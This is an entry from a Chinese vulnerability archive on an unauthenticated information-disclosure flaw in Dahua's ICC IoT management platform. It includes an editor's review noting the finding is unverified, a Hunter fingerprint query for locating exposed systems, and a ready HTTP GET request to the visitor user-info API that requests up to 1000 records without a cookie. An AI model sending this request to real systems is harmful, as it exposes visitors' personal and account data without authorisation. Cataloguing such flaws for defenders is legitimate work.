---
source: "wy876 漏洞文库"
id: "vw-143d8557b5a409e44e3f6c3c"
entity_id: "ve-143d8557b5a409e44e3f6c3c"
schema_version: "1"
title: "大华智能物联综合管理平台(ICC)info存在信息泄露"
product: "大华ICC"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "userId4，无Cookie；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%AE%BE%E5%A4%87/%E5%A4%A7%E5%8D%8E%E6%99%BA%E8%83%BD%E7%89%A9%E8%81%94%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%28ICC%29info%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/qiwf6qcxedf9t1ir"
source_status: "recorded"
previous_fofa_unverified: "web.body="
hunter: "web.body=\"*客户端会小于800*\""
---

# 大华智能物联综合管理平台(ICC)info存在信息泄露

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：大华ICC
- 本文讨论：evo-visitor card/visitor/user/info userId信息泄露
- 版本、权限与配置前提：userId4，无Cookie；版本未知
- 资料类型：访客信息接口线索；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 未列实际返回字段/敏感性，不能只因接口名认定泄露
- 单ID缺跨用户/匿名对照，pageSize1000范围无说明
- 版本路径1.0.0不是产品固件；Hunter元数据残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 对象权限/具体数据类型/产品版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
浙江大华技术股份有限公司，是全球领先的以视频为核心的智慧物联解决方案提供商和运营服务商，大华智能物联综合管理平台(ICC)info存在信息泄露。

# 二、影响版本
+ 大华智能物联综合管理平台(ICC)

# 三、资产测绘
+ hunter`web.body="*客户端会小于800*"`
+ 特征


# 四、漏洞复现
```http
GET /evo-apigw/evo-visitor/1.0.0/card/visitor/user/info?userId=4&pageNum=1&pageSize=1000 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qiwf6qcxedf9t1ir>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
